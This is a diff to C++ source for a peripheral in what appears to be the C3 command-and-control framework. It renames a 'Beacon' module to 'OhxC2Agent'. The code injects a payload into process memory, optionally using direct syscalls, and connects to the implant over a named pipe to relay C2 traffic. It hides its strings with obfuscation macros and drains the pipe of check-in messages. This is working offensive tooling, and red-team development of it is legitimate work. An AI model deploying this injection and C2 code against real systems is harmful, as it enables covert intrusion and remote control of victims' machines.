@@ -1,10 +1,11 @@
 #include "StdAfx.h"
-#include "Beacon.h"
+
+#include "0xC2Agent.h"
 
 using namespace FSecure::Literals;
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
+FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OhxC2Agent(ByteView arguments)
 {
 	auto [pipeName, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, payload] = arguments.Read<std::string, uint16_t, uint16_t, bool, ByteView>();
 
@@ -15,12 +16,14 @@ FSecure::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
 	if (pipeName.empty() || !maxConnectionAttempts)
 		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));
 
-	// Store a handle to the beacon object for later use
-	m_Beacon = WinTools::InjectionBuffer(payload, useSyscalls);
+	// Store a handle to the OhxC2Agent object for later use
+	m_OhxC2Agent = WinTools::InjectionBuffer(payload, useSyscalls);
+	DWORD threadId = GetThreadId(m_OhxC2Agent.GetThreadHandle());
+	pipeName = pipeName + std::to_string(threadId);
+	
+	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give OhxC2Agent thread time to start pipe.
 
-	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give beacon thread time to start pipe.
-
-	// Connect to our Beacon named Pipe.
+	// Connect to our OhxC2Agent named Pipe.
 	for (uint16_t connectionTrial = 0u; connectionTrial < maxConnectionAttempts; ++connectionTrial)
 	{
 		try
@@ -31,76 +34,74 @@ FSecure::C3::Interfaces::Peripherals::Beacon::Beacon(ByteView arguments)
 		catch (std::exception& e)
 		{
 			// Sleep between trials.
-			Log({ OBF_SEC("Beacon constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
+			Log({ OBF_SEC("OhxC2Agent constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
 			std::this_thread::sleep_for(std::chrono::milliseconds{ delayBetweenConnectionTrials });
 		}
 	}
 
 	// Throw a time-out exception.
-	throw std::runtime_error{OBF("Beacon creation failed")};
+	throw std::runtime_error{ OBF("OhxC2Agent creation failed") };
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::C3::Interfaces::Peripherals::Beacon::~Beacon()
+FSecure::C3::Interfaces::Peripherals::OhxC2Agent::~OhxC2Agent()
 {
-	HANDLE threadHandle = m_Beacon.GetThreadHandle();
+	HANDLE threadHandle = m_OhxC2Agent.GetThreadHandle();
 	// Check if thread already finished running and kill if otherwise
 	if (WaitForSingleObject(threadHandle, 0) != WAIT_OBJECT_0)
 		TerminateThread(threadHandle, 0);
 }
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-void FSecure::C3::Interfaces::Peripherals::Beacon::OnCommandFromConnector(ByteView data)
+void FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OnCommandFromConnector(ByteView data)
 {
-	m_SendQueue.emplace_back(data);
+	if (data.size() == 1 && data[0] == 0u)
+	{
+		m_ReceiverDecrypting = true;
+	}
+	else
+	{
+		m_Pipe->Write(data);
+	}
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Beacon::OnReceiveFromPeripheral()
+FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OnReceiveFromPeripheral()
 {
 	if (m_Close)
 		return {};
 
-	// No Commands to Send
-	if (m_SendQueue.empty())
+	auto ret = m_Pipe->Read(false, true);
+	
+	if (ret.size() == 56u && m_ReceiverDecrypting)
 	{
-		// Send a NoOp to get any data that it is ready to send
-		m_SendQueue.emplace_back("\0"_bv);
-	}
-
-	auto msg = std::move(m_SendQueue.front());
-	m_SendQueue.pop_front();
-	m_Pipe->Write(msg);
-	auto ret = m_Pipe->Read(true, false);
-
-	// Dont transfer NoOps over the C2
-	if (IsNoOp(ret))
+		// If a low sleep time the named pipe may get full of checkins so we need
+		// to drain the named pipe until we get to some real data.
+		while (true)
+		{
+			ret = m_Pipe->Read(false, true);
+			if (ret.size() == 0)
+				return {};
+			else if (ret.size() == 56u)
+				continue;
+			else
+				return ret;			
+		}
+		// Stop sending messages after we are signalled that decryption is occuring.
 		return {};
+	}
 
 	return ret;
 }
 
-
-bool FSecure::C3::Interfaces::Peripherals::Beacon::IsNoOp(ByteView data)
-{
-	return data.size() == 1 && data[0] == 0u;
-}
-
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-const char* FSecure::C3::Interfaces::Peripherals::Beacon::GetCapability()
+const char* FSecure::C3::Interfaces::Peripherals::OhxC2Agent::GetCapability()
 {
-	return R"(
+	return R"_(
 {
 	"create":
 	{
 		"arguments":
 		[
-			{
-				"type": "string",
-				"name": "Pipe name",
-				"min": 4,
-				"randomize": true,
-				"description": "Name of the pipe Beacon uses for communication."
-			},
 			{
 				"type": "int16",
 				"min": 1,
@@ -119,18 +120,21 @@ const char* FSecure::C3::Interfaces::Peripherals::Beacon::GetCapability()
 				"type": "boolean",
 				"name": "Use Syscalls",
 				"defaultValue": false,
-				"description": "Enable the use of Direct Syscalls for beacon injection"
+				"description": "Enable the use of Direct Syscalls for OhxC2Agent injection"
 			}
 		]
 	},
-	"commands": []
+	"commands":
+	[
+	]
 }
-)";
+)_";
 }
 
-void FSecure::C3::Interfaces::Peripherals::Beacon::Close()
+void FSecure::C3::Interfaces::Peripherals::OhxC2Agent::Close()
 {
 	FSecure::C3::Device::Close();
 	m_Close = true;
+	// Close thread? m_OhxC2Agent
 }
 
